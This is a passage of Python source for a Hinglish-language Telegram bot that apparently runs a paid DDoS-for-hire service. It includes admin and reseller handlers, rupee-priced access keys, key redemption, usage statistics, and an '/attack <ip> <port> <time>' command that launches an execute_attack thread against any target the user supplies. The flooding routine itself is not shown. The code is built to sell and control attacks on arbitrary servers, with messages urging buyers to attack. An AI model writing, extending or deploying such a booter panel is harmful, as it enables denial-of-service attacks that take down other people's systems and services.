                log_action(user_id, username, "/addadmin", f"Target: {target}", response)
                return
            if target_id in admin_id:
                response = format_response(
                    header="ALREADY ADMIN",
                    body=f"User ID {target_id} pehle se hi admin hai! ✅"
                )
                safe_reply(bot, message, response)
                log_action(user_id, username, "/addadmin", f"Target: {target}", response)
                return
            admin_id.add(target_id)
            target_username = "Unknown"
            try:
                chat = bot.get_chat(target_id)
                target_username = chat.username or chat.first_name or "Unknown"
            except:
                pass
            response = format_response(
                header="ADMIN ADDED",
                body=(
                    f"Admin add ho gaya! 🎉\n"
                    f"<b><i>User ID</i></b>: {target_id}\n"
                    f"<b><i>Username</i></b>: @{target_username}\n\n"
                    f"<b><i>COSMIC COMMAND</i></b>: /checkadmin dekh list! ✅"
                )
            )
        except ValueError:
            response = format_response(
                header="COMMAND ERROR",
                body="Invalid ID ya username! Username @ se start hona chahiye ya ID number hona chahiye. ❌"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addadmin", f"Target: {target}", response)
            return
    save_data()
    safe_reply(bot, message, response)
    log_action(user_id, username, "/addadmin", f"Target: {target}, Username: {target_username}", response)

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["removeadmin"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_overlord(user_id, username):
        response = format_response(
            header="ACCESS DENIED",
            body="Bhai, ye sirf Overlord ka kaam hai! 🚫\n\n<b><i>COSMIC COMMAND</i></b>: @Rahul_618 se baat kar! 📩"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removeadmin", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = format_response(
            header="COMMAND ERROR",
            body=(
                f"Sahi format mein daal, bhai!\n"
                f"<b><i>Usage</i></b>: /removeadmin <username_or_id>\n"
                f"<b><i>Example</i></b>: /removeadmin @user123 ya /removeadmin 123456789 📋"
            )
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removeadmin", f"Command: {command}", response)
        return

    target = command_parts[1]
    target_username = "Unknown"
    if target.startswith('@'):
        target_username = target.lower()
        if target_username in overlord_usernames:
            response = format_response(
                header="OVERLORD ALERT",
                body="Overlord ko remove nahi kar sakte! 🚫"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
            return
        if target_username not in admin_usernames:
            response = format_response(
                header="NOT ADMIN",
                body=f"{target} admin nahi hai! ❌"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
            return
        admin_usernames.remove(target_username)
        response = format_response(
            header="ADMIN REMOVED",
            body=(
                f"Admin remove ho gaya! 🗑️\n"
                f"<b><i>Username</i></b>: {target}\n\n"
                f"<b><i>COSMIC COMMAND</i></b>: /checkadmin dekh list! ✅"
            )
        )
    else:
        try:
            target_id = str(int(target))
            if target_id in overlord_id:
                response = format_response(
                    header="OVERLORD ALERT",
                    body="Overlord ko remove nahi kar sakte! 🚫"
                )
                safe_reply(bot, message, response)
                log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
                return
            if target_id not in admin_id:
                response = format_response(
                    header="NOT ADMIN",
                    body=f"User ID {target_id} admin nahi hai! ❌"
                )
                safe_reply(bot, message, response)
                log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
                return
            admin_id.remove(target_id)
            try:
                chat = bot.get_chat(target_id)
                target_username = chat.username or chat.first_name or "Unknown"
            except:
                pass
            response = format_response(
                header="ADMIN REMOVED",
                body=(
                    f"Admin remove ho gaya! 🗑️\n"
                    f"<b><i>User ID</i></b>: {target_id}\n"
                    f"<b><i>Username</i></b>: @{target_username}\n\n"
                    f"<b><i>COSMIC COMMAND</i></b>: /checkadmin dekh list! ✅"
                )
            )
        except ValueError:
            response = format_response(
                header="COMMAND ERROR",
                body="Invalid ID ya username! Username @ se start hona chahiye ya ID number hona chahiye. ❌"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/removeadmin", f"Target: {target}", response)
            return
    save_data()
    safe_reply(bot, message, response)
    log_action(user_id, username, "/removeadmin", f"Target: {target}, Username: {target_username}", response)

@bot.message_handler(commands=['checkadmin'])
def check_admin(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["checkadmin"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    response = format_response(
        header="COSMIC LEADERS",
        body=(
            f"<b><i>OVERLORDS:</i></b>\n"
            f"{''.join([f'👤 <b><i>User ID</i></b>: {oid}\n🎭 <b><i>Username</i></b>: @{bot.get_chat(oid).username or bot.get_chat(oid).first_name or 'Unknown'}\n👑 <b><i>Role</i></b>: Overlord\n\n' for oid in overlord_id]) + ''.join([f'🎭 <b><i>Username</i></b>: {uname}\n👤 <b><i>User ID</i></b>: Unknown\n👑 <b><i>Role</i></b>: Overlord\n\n' for uname in overlord_usernames])}"
            f"<b><i>ADMINS:</i></b>\n"
            f"{'Koi additional admins nahi hai.\n' if not admin_id and not admin_usernames else ''.join([f'👤 <b><i>User ID</i></b>: {aid}\n🎭 <b><i>Username</i></b>: @{bot.get_chat(aid).username or bot.get_chat(aid).first_name or 'Unknown'}\n✅ <b><i>Role</i></b>: Admin\n\n' for aid in admin_id if aid not in overlord_id]) + ''.join([f'🎭 <b><i>Username</i></b>: {uname}\n👤 <b><i>User ID</i></b>: Unknown\n✅ <b><i>Role</i></b>: Admin\n\n' for uname in admin_usernames if uname not in overlord_usernames])}"
            f"<b><i>COSMIC COMMAND</i></b>: /addadmin ya /removeadmin se manage kar! 🚀"
        )
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/checkadmin", "", response)

@bot.message_handler(commands=['genkey'])
def gen_key(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["genkey"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if user_id not in resellers:
        response = format_response(
            header="ACCESS DENIED",
            body="Bhai, tu reseller nahi hai! 🚫\n\n<b><i>COSMIC INSIGHT</i></b>: @Rahul_618 se reseller banne ke liye baat kar! 📩"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/genkey", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 3:
        response = format_response(
            header="COMMAND ERROR",
            body=(
                f"Sahi format mein daal, bhai!\n"
                f"<b><i>Usage</i></b>: /genkey <duration> <context>\n"
                f"<b><i>Example</i></b>: /genkey 1d group 📋\n"
                f"<b><i>Durations</i></b>: 1min, 1h, 1d, 7d, 1m\n"
                f"<b><i>Contexts</i></b>: group, private"
            )
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/genkey", f"Command: {command}", response)
        return

    duration, context = command_parts[1].lower(), command_parts[2].lower()
    if duration not in KEY_COST:
        response = format_response(
            header="COMMAND ERROR",
            body=f"Invalid duration! ❌\n<b><i>Durations</i></b>: 1min, 1h, 1d, 7d, 1m"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/genkey", f"Command: {command}", response)
        return

    if context not in ['group', 'private']:
        response = format_response(
            header="COMMAND ERROR",
            body=f"Invalid context! ❌\n<b><i>Contexts</i></b>: group, private"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/genkey", f"Command: {command}", response)
        return

    cost = KEY_COST[duration]
    if resellers[user_id]['balance'] < cost:
        response = format_response(
            header="INSUFFICIENT BALANCE",
            body=(
                f"Tere paas {resellers[user_id]['balance']} Rs hai, par {duration} key ke liye {cost} Rs chahiye! 😢\n"
                f"<b><i>COSMIC INSIGHT</i></b>: @Rahul_618 se balance add karwa! 💰\n"
                f"<b><i>COSMIC COMMAND</i></b>: /balance se check kar! 📋"
            )
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/genkey", f"Command: {command}, Balance: {resellers[user_id]['balance']}, Cost: {cost}", response)
        return

    key = f"Rahul_sadiq-{random.randint(1000, 9999)}"
    while key in keys:
        key = f"Rahul_sadiq-{random.randint(1000, 9999)}"

    resellers[user_id]['balance'] -= cost
    keys[key] = {
        "duration": duration,
        "device_limit": 1,
        "devices": [],
        "blocked": False,
        "context": context,
        "generated_time": datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
    }
    stats["total_keys"] += 1
    stats["key_gen_timestamps"].append(datetime.datetime.now(IST))
    save_data()

    response = format_response(
        header="KEY GENERATED",
        body=(
            f"Yeh lo, tera naya key, bhai! 🔑\n"
            f"<b><i>Key</i></b>: `{key}`\n"
            f"<b><i>Duration</i></b>: {duration}\n"
            f"<b><i>Context</i></b>: {context.capitalize()}\n"
            f"<b><i>Generated by</i></b>: @{username}\n"
            f"<b><i>COPY THIS KEY</i></b>: `{key}`\n\n"
            f"<b><i>COSMIC INSIGHT</i></b>: Is key se {context} mein attack kar sakta hai! 💥\n"
            f"<b><i>COSMIC COMMAND</i></b>: /redeem {key} se activate kar! 🚀"
        )
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/genkey", f"Key: {key}, Duration: {duration}, Context: {context}, Balance Left: {resellers[user_id]['balance']}", response)

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["balance"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if user_id not in resellers:
        response = format_response(
            header="ACCESS DENIED",
            body="Bhai, tu reseller nahi hai! 🚫\n\n<b><i>COSMIC INSIGHT</i></b>: @Rahul_618 se reseller banne ke liye baat kar! 📩"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/balance", f"Command: {command}", response)
        return

    response = format_response(
        header="RESELLER BALANCE",
        body=(
            f"Tera balance check kar liya, bhai! 💰\n"
            f"<b><i>User ID</i></b>: {user_id}\n"
            f"<b><i>Username</i></b>: @{username}\n"
            f"<b><i>Current Balance</i></b>: {resellers[user_id]['balance']} Rs\n\n"
            f"<b><i>COSMIC INSIGHT</i></b>: Balance low hai toh @Rahul_618 se add karwa! 📩\n"
            f"<b><i>COSMIC COMMAND</i></b>: /genkey se nayi key banaye! 🔑"
        )
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/balance", f"Balance: {resellers[user_id]['balance']}", response)

@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["addreseller"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = format_response(
            header="ACCESS DENIED",
            body="Bhai, ye sirf admins ka kaam hai! 🚫\n\n<b><i>COSMIC COMMAND</i></b>: @Rahul_618 se baat kar! 📩"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addreseller", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 3:
        response = format_response(
            header="COMMAND ERROR",
            body=(
                f"Sahi format mein daal, bhai!\n"
                f"<b><i>Usage</i></b>: /addreseller <user_id> <balance>\n"
                f"<b><i>Example</i></b>: /addreseller 123456789 1000 📋"
            )
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addreseller", f"Command: {command}", response)
        return

    target_id = command_parts[1]
    try:
        balance = int(command_parts[2])
        if balance < 0:
            response = format_response(
                header="COMMAND ERROR",
                body="Balance negative nahi ho sakta! ❌"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addreseller", f"Command: {command}", response)
            return
    except ValueError:
        response = format_response(
            header="COMMAND ERROR",
            body="Balance number hona chahiye! ❌"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addreseller", f"Command: {command}", response)
        return

    try:
        target_id = str(int(target_id))
    except ValueError:
        response = format_response(
            header="COMMAND ERROR",
            body="User ID number hona chahiye! ❌"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addreseller", f"Command: {command}", response)
        return

    target_username = "Unknown"
    try:
        chat = bot.get_chat(target_id)
        target_username = chat.username or chat.first_name or "Unknown"
    except:
        pass

    if target_id in resellers:
        response = format_response(
            header="ALREADY RESELLER",
            body=(
                f"User ID {target_id} pehle se reseller hai! ✅\n"
                f"<b><i>Username</i></b>: @{resellers[target_id].get('username', 'Unknown')}\n"
                f"<b><i>Current Balance</i></b>: {resellers[target_id]['balance']} Rs"
            )
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addreseller", f"Target ID: {target_id}, Username: {target_username}, Balance: {balance}", response)
        return

    resellers[target_id] = {"balance": balance, "username": target_username}
    save_data()
    response = format_response(
        header="RESELLER ADDED",
        body=(
            f"Reseller add ho gaya! 🎉\n"
            f"<b><i>User ID</i></b>: {target_id}\n"
            f"<b><i>Username</i></b>: @{target_username}\n"
            f"<b><i>Initial Balance</i></b>: {balance} Rs\n\n"
            f"<b><i>COSMIC INSIGHT</i></b>: Ab yeh user keys generate kar sakta hai! 💥\n"
            f"<b><i>COSMIC COMMAND</i></b>: /resellers dekh list! 📋"
        )
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/addreseller", f"Target ID: {target_id}, Username: {target_username}, Balance: {balance}", response)

@bot.message_handler(commands=['listkeys'])
def list_keys(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["listkeys"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = format_response(
            header="ACCESS DENIED",
            body="Bhai, ye sirf admins ka kaam hai! 🚫\n\n<b><i>COSMIC COMMAND</i></b>: @Rahul_618 se baat kar! 📩"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/listkeys", f"Command: {command}", response)
        return

    if not keys:
        response = format_response(
            header="NO KEYS FOUND",
            body="Koi keys nahi hai, bhai! 😢\n\n<b><i>COSMIC INSIGHT</i></b>: /genkey se nayi key bana! 🔑"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/listkeys", "No keys available", response)
        return

    key_list = []
    for key, info in keys.items():
        # Get usernames for devices
        device_info = []
        for device_id in info.get("devices", []):
            device_username = "Unknown"
            # Check stored username in users or resellers
            if device_id in users and users[device_id].get("username"):
                device_username = users[device_id]["username"]
            elif device_id in resellers and resellers[device_id].get("username"):
                device_username = resellers[device_id]["username"]
            else:
                # Fetch from Telegram API if not stored
                try:
                    chat = bot.get_chat(device_id)
                    device_username = chat.username or chat.first_name or f"UserID_{device_id}"
                except:
                    device_username = f"UserID_{device_id}"
            device_info.append(f"{device_id} (@{formatting.escape_markdown(device_username)})")
        devices_str = ", ".join(device_info) if device_info else "None"
        
        key_info = (
            f"- <b><i>Key</i></b>: `{formatting.escape_markdown(key)}`\n"
            f"- <b><i>Duration</i></b>: {info['duration']}\n"
            f"- <b><i>Context</i></b>: {info['context'].capitalize()}\n"
            f"- <b><i>Generated on</i></b>: {info['generated_time']}\n"
            f"- <b><i>Devices</i></b>: [{devices_str}]\n"
            f"- <b><i>Blocked</i></b>: {'Yes 🚫' if info['blocked'] else 'No ✅'}\n"
        )
        key_list.append(key_info)

    response = format_response(
        header="KEY VAULT",
        body=(
            f"Yeh hai sab keys ka cosmic vault, bhai! 🔑\n\n"
            f"{''.join(key_list)}\n"
            f"<b><i>COSMIC INSIGHT</i></b>: Keys ko /block se block kar sakte ho! 💥\n"
            f"<b><i>COSMIC COMMAND</i></b>: /stats dekh system ka report card! 📊"
        )
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/listkeys", f"Keys listed: {len(keys)}", response)

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["myinfo"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)

    if user_id not in users:
        response = format_response(
            header="NO ACCESS",
            body=(
                f"Bhai, tera koi active key nahi hai! 😢\n"
                f"<b><i>User ID</i></b>: {user_id}\n"
                f"<b><i>Username</i></b>: @{formatting.escape_markdown(username)}\n\n"
                f"<b><i>COSMIC INSIGHT</i></b>: @Rahul_618 se key kharid aur /redeem kar! 🔑"
            )
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/myinfo", "", response)
        return

    user_info = users[user_id]
    exp_date = datetime.datetime.strptime(user_info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
    remaining_time = exp_date - datetime.datetime.now(IST)
    days = remaining_time.days
    hours, remainder = divmod(remaining_time.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    time_left = f"{days}d {hours}h {minutes}m {seconds}s" if days >= 0 else "Expired"

    role = "User"
    if is_overlord(user_id, username):
        role = "Overlord"
    elif is_admin(user_id, username):
        role = "Admin"
    elif user_id in resellers:
        role = "Reseller"

    response = format_response(
        header="USER PROFILE",
        body=(
            f"Yeh hai tera cosmic profile, bhai! 🌌\n"
            f"<b><i>User ID</i></b>: {user_id}\n"
            f"<b><i>Username</i></b>: @{formatting.escape_markdown(username)}\n"
            f"<b><i>Role</i></b>: {role}\n"
            f"<b><i>Key Context</i></b>: {user_info['context'].capitalize()}\n"
            f"<b><i>Expiration</i></b>: {user_info['expiration']}\n"
            f"<b><i>Time Left</i></b>: {time_left}\n"
            f"{f'<b><i>Reseller Balance</i></b>: {resellers[user_id]['balance']} Rs\n' if user_id in resellers else ''}"
            f"\n<b><i>COSMIC INSIGHT</i></b>: {f'Attack ke liye /attack use kar!' if time_left != 'Expired' else 'Key expire ho gaya, naya key /redeem kar!'} 🚀"
        )
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/myinfo", f"Role: {role}, Context: {user_info['context']}, Expiration: {user_info['expiration']}", response)

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["redeem"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = format_response(
            header="COMMAND ERROR",
            body=(
                f"Sahi format mein daal, bhai!\n"
                f"<b><i>Usage</i></b>: /redeem <key>\n"
                f"<b><i>Example</i></b>: /redeem Rahul_sadiq-1234 📋"
            )
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Command: {command}", response)
        return

    key = command_parts[1]
    if key not in keys:
        response = format_response(
            header="INVALID KEY",
            body="Yeh key galat hai ya expire ho gaya! 😢\n\n<b><i>COSMIC INSIGHT</i></b>: @Rahul_618 se naya key le! 🔑"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Key: {key}", response)
        return

    key_info = keys[key]
    if key_info["blocked"]:
        response = format_response(
            header="BLOCKED KEY",
            body="Yeh key block ho gaya hai! 🚫\n\n<b><i>COSMIC INSIGHT</i></b>: @Rahul_618 se baat kar! 📩"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Key: {key}", response)
        return

    if len(key_info["devices"]) >= key_info["device_limit"]:
        response = format_response(
            header="DEVICE LIMIT REACHED",
            body="Is key ka device limit khatam ho gaya! 😢\n\n<b><i>COSMIC INSIGHT</i></b>: @Rahul_618 se naya key le! 🔑"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Key: {key}", response)
        return

    generated_time = datetime.datetime.strptime(key_info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
    minutes, hours, days, months = parse_duration(key_info["duration"])
    expiration_time = generated_time + relativedelta(months=months, days=days, hours=hours, minutes=minutes)

    if datetime.datetime.now(IST) > expiration_time:
        del keys[key]
        stats["expired_keys"] += 1
        save_data()
        response = format_response(
            header="EXPIRED KEY",
            body="Yeh key expire ho gaya! 😢\n\n<b><i>COSMIC INSIGHT</i></b>: @Rahul_618 se naya key le! 🔑"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Key: {key}", response)
        return

    key_info["devices"].append(user_id)
    users[user_id] = {        "context": key_info["context"],
        "expiration": expiration_time.strftime('%Y-%m-%d %I:%M:%S %p'),
        "username": username
    }
    stats["redeemed_keys"] += 1
    save_data()

    response = format_response(
        header="KEY REDEEMED",
        body=(
            f"Key redeem ho gaya, bhai! 🎉\n"
            f"<b><i>Key</i></b>: `{formatting.escape_markdown(key)}`\n"
            f"<b><i>Duration</i></b>: {key_info['duration']}\n"
            f"<b><i>Context</i></b>: {key_info['context'].capitalize()}\n"
            f"<b><i>Expiration</i></b>: {users[user_id]['expiration']}\n\n"
            f"<b><i>COSMIC INSIGHT</i></b>: Ab {key_info['context']} mein attack kar sakta hai! 💥\n"
            f"<b><i>COSMIC COMMAND</i></b>: /attack se shuru kar ya /myinfo dekh! 🚀"
        )
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/redeem", f"Key: {key}, Context: {key_info['context']}, Expiration: {users[user_id]['expiration']}", response)

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'
    stats["command_usage"]["attack"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if user_id not in users and not is_overlord(user_id, username):
        response = format_response(
            header="NO ACCESS",
            body=(
                f"Bhai, tera koi active key nahi hai! 😢\n"
                f"<b><i>COSMIC INSIGHT</i></b>: @Rahul_618 se key le aur /redeem kar! 🔑"
            )
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Command: {command}", response)
        return

    if not is_overlord(user_id, username) and not has_valid_context(user_id, chat_type):
        response = format_response(
            header="CONTEXT MISMATCH",
            body=(
                f"Yeh key {chat_type} mein kaam nahi karta! 😡\n"
                f"<b><i>Key Context</i></b>: {users[user_id]['context'].capitalize()}\n\n"
                f"<b><i>COSMIC INSIGHT</i></b>: Sahi context mein try kar ya @Rahul_618 se baat kar! 📩"
            )
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Command: {command}, Context: {chat_type}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 4:
        response = format_response(
            header="COMMAND ERROR",
            body=(
                f"Sahi format mein daal, bhai!\n"
                f"<b><i>Usage</i></b>: /attack <ip> <port> <time>\n"
                f"<b><i>Example</i></b>: /attack 192.168.1.1 80 300 📋"
            )
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Command: {command}", response)
        return

    target, port, time = command_parts[1], command_parts[2], command_parts[3]

    if not is_overlord(user_id, username):
        if user_id in last_attack_time:
            time_since_last = (datetime.datetime.now(IST) - last_attack_time[user_id]).total_seconds()
            if time_since_last < COOLDOWN_PERIOD:
                remaining = int(COOLDOWN_PERIOD - time_since_last)
                response = format_response(
                    header="COOLDOWN ACTIVE",
                    body=(
                        f"Bhai, thoda ruk! ⏳\n"
                        f"<b><i>Cooldown</i></b>: {remaining} seconds baaki hai!\n\n"
                        f"<b><i>COSMIC INSIGHT</i></b>: Cooldown khatam hone ke baad attack kar! 🚀"
                    )
                )
                safe_reply(bot, message, response)
                log_action(user_id, username, "/attack", f"Command: {command}, Cooldown Remaining: {remaining}", response)
                return

    threading.Thread(target=execute_attack, args=(target, port, time, message, username, last_attack_time, user_id, chat_type)).start()

@bot.message_handler(commands=['stats'])
def stats_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["stats"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)

    if not is_overlord(user_id, username):
        response = format_response(
            header="ACCESS DENIED",
            body="Bhai, ye sirf Overlord ka kaam hai! 🚫\n\n<b><i>COSMIC COMMAND</i></b>: @Rahul_618 se baat kar! 📩"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/stats", "", response)
        return

    active_keys = len([key for key, info in keys.items() if not info.get("blocked", False) and (datetime.datetime.now(IST) < (datetime.datetime.strptime(info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST) + relativedelta(**dict(zip(['minutes', 'hours', 'days', 'months'], parse_duration(info["duration"]))))))])
    command_usage_str = "\n".join([f"📜 */{cmd}*: __{count}__" for cmd, count in stats["command_usage"].items()])
    memory_usage = len(keys) * 0.1 + len(users) * 0.05 + len(resellers) * 0.02

    response = format_response(
        header=f"{random.choice(cyberpunk_quotes)}",
        body=(
            f"Bhai Overlord, yeh hai live report card! 🔥\n\n"
            f"<b><i>VAULT STATUS:</i></b>\n"
            f"🔑 <b><i>Total Keys</i></b>: __{stats['total_keys']}__\n"
            f"🔑 <b><i>Active Keys</i></b>: __{active_keys}__\n"
            f"🔓 <b><i>Redeemed Keys</i></b>: __{stats['redeemed_keys']}__\n"
            f"❌ <b><i>Expired Keys</i></b>: __{stats['expired_keys']}__\n"
            f"🔑 <b><i>Keys/min</i></b>: __{calculate_keys_per_minute()}__\n\n"
            f"<b><i>ATTACK STATUS:</i></b>\n"
            f"💥 <b><i>Active Attacks</i></b>: __{stats['active_attacks']}__\n"
            f"💥 <b><i>Total Attacks</i></b>: __{stats['total_attacks']}__\n"
            f"⏱️ <b><i>Avg Attack Duration</i></b>: __{calculate_avg_attack_duration()}__\n\n"
            f"<b><i>USER STATUS:</i></b>\n"
            f"👥 <b><i>Total Users</i></b>: __{len(stats['total_users'])}__\n"
            f"👤 <b><i>Active Users (Last 5 min)</i></b>: __{active_users_count}__\n"
            f"👥 <b><i>Peak Active Users</i></b>: __{stats['peak_active_users']}__\n\n"
            f"<b><i>SYSTEM STATUS:</i></b>\n"
            f"⏳ <b><i>Bot Uptime</i></b>: __{calculate_uptime()}__\n"
            f"⚙️ <b><i>Memory Usage (Simulated)</i></b>: __{memory_usage:.2f}MB__\n\n"
            f"<b><i>COMMAND USAGE:</i></b>\n{command_usage_str}\n\n"
            f"<b><i>📅 Last Updated</i></b>: __{datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}__\n"
            f"```nebula> overlord_stats\nstatus: RUNNING 🚀```\n"
            f"<b><i>⚡️ Cosmic power unleashed, bhai! ⚡️</i></b>"
        )
    )
    sent_message = bot.send_message(message.chat.id, formatting.escape_markdown(append_compulsory_message(response)), parse_mode="MarkdownV2")
    threading.Thread(target=live_stats_update, args=(message.chat.id, sent_message.message_id)).start()
    log_action(user_id, username, "/stats", "", response)

@bot.message_handler(commands=['block'])
def block_key(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["block"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = format_response(
            header="ACCESS DENIED",
            body="Bhai, ye sirf admins ka kaam hai! 🚫\n\n<b><i>COSMIC COMMAND</i></b>: @Rahul_618 se baat kar! 📩"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = format_response(
            header="COMMAND ERROR",
            body=(
                f"Sahi format mein daal, bhai!\n"
                f"<b><i>Usage</i></b>: /block <key>\n"
                f"<b><i>Example</i></b>: /block Rahul_sadiq-1234 📋"
            )
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Command: {command}", response)
        return

    key = command_parts[1]
    if key not in keys:
        response = format_response(
            header="INVALID KEY",
            body="Yeh key nahi mila ya pehle hi expire ho gaya! 😢\n\n<b><i>COSMIC COMMAND</i></b>: /listkeys dekh available keys! 🔑"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Key: {key}", response)
        return

    if keys[key]["blocked"]:
        response = format_response(
            header="ALREADY BLOCKED",
            body=f"Key `{formatting.escape_markdown(key)}` pehle se hi block hai! 🚫"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Key: {key}", response)
        return

    keys[key]["blocked"] = True
    for device_id in keys[key]["devices"]:
        if device_id in users:
            del users[device_id]
    save_data()

    response = format_response(
        header="KEY BLOCKED",
        body=(
